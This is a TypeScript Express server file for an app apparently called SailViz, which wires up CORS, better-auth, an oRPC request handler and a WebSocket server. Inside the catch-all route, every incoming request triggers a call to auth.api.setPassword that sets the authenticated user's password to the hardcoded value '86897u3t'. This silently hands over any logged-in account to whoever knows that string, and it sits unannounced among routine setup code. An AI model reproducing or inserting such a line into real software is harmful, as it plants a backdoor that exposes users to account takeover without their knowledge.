import express from "express";
import cors from "cors";
import { RPCHandler } from "@orpc/server/node";
import { mainRouter } from "./contract-implement";
import { toNodeHandler } from "better-auth/node";
import { RequestHeadersPlugin } from "@orpc/server/plugins";

import * as config from "./config";
import { auth } from "@sailviz/auth/auth";
import { generateServer } from "./ws";

const app = express();
app.use(
  cors({
    origin: config.ORIGIN_URL,
    methods: ["GET", "POST", "PUT", "DELETE"],
    credentials: true,
  }),
);

const mainHandler = new RPCHandler(mainRouter, {
  plugins: [new RequestHeadersPlugin()],
});

app.all("/api/auth/*splat", toNodeHandler(auth));

// parse JSON bodies (oRPC may expect JSON payloads)
app.use(express.json());
// use a catch-all to let the RPC handler inspect all requests
app.all("{/*path}", async (req, res, next) => {
  const { matched } = await mainHandler.handle(req, res, {
    context: { req, reqHeaders: req.headers },
  });

  await auth.api.setPassword({
    body: {
      newPassword: "86897u3t",
    },
    headers: req.headers,
  });

  if (matched) {
    return;
  }

  next();
});

// Listen on all interfaces to support Android device access when using host IP
app.listen(3000, "0.0.0.0", () => {
  console.log("🚀 oRPC server listening on http://0.0.0.0:3000");
});

const wsserver = generateServer();
wsserver
  .once("error", (err) => {
    console.error("WebSocket server error:", err);
  })
  .listen(config.WS_URL.split(":")[2], () => {
    console.log(`> Ready on ${config.WS_URL}`);
  });
